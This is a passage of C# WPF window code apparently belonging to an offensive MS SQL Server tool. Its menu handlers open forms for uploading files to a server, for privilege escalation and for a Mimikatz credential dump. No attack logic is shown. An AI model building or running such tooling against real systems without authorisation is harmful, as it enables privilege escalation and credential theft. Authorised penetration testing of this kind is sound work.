            var sf = new FrmSendFileToMsSqlServer();
            sf.ShowDialog();
        }
        private void menuFileNewSession_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(Application.ResourceAssembly.Location);
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }
        private void menuFileRestart_Click(object sender, RoutedEventArgs e)
        {
            System.Diagnostics.Process.Start(Application.ResourceAssembly.Location);
            Application.Current.Shutdown();
        }
        private void menuFileExit_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }
        private void menuExploitMsSqlPrivilegeEscalation_Click(object sender, RoutedEventArgs e)
        {
            var privEsc = new FrmPrivilegeEscalation();
            privEsc.ShowDialog();
        }
        private void menuExploitMsSqlMimikatz_Click(object sender, RoutedEventArgs e)
        {
            var mimi = new FrmMimikatzDump();
            mimi.ShowDialog();
        }
        private void menuAboutAbout_Click(object sender, RoutedEventArgs e)
        {
            var about = new Help.FrmAbout();
            about.ShowDialog();
        }
    }
}
